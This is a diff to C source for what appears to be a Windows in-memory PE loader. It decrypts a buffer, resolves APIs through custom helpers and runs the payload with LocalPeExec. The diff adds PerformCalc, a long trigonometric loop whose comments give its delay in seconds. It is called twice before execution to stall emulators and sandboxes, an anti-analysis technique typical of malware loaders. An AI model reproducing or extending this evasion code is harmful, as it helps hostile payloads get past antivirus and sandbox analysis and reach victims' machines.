@@ -1,5 +1,6 @@
 #include <stdio.h>
 #include <Windows.h>
+#include <math.h>
 
 #include "helpers.h"
 #include "antie.h"
@@ -694,8 +695,32 @@ BOOL LocalPeExec(IN PPE_HEADERS pPeHeaders)
 	return TRUE;
 }
 
+double PerformCalc(double base)
+{
+	// base 30 => 20 sec
+	// base 28 => 12 sec
+	// base 25 => 5 sec
+
+	double result = 0.0;
+	double i = pow(base, 7.0);
+
+	while (i >= 0)
+	{
+		result += atan(i) * tan(i);
+		i = i - 1.0;
+	}
+
+	return i;
+}
+
 int main(int argc, char* argv[])
 {
+
+	double res = 0.0;
+	res = PerformCalc(30.0);
+	if (res > 0.0)
+		return -1;
+
 	tGetProcessId pGetProcessId = (tGetProcessId)hlpGetProcAddress(hlpGetModuleHandle(L"kernel32.dll"), "GetProcessId");
 	
 	if (isDebug)
@@ -717,6 +742,11 @@ int main(int argc, char* argv[])
 		return -1;
 
 	if (!InitializePeStruct(&peHeaders, pDecBuffer, dwFileSize))
+		return -1;
+
+
+	res = PerformCalc(25.0);
+	if (res > 0.0)
 		return -1;
 
 	LocalPeExec(&peHeaders);
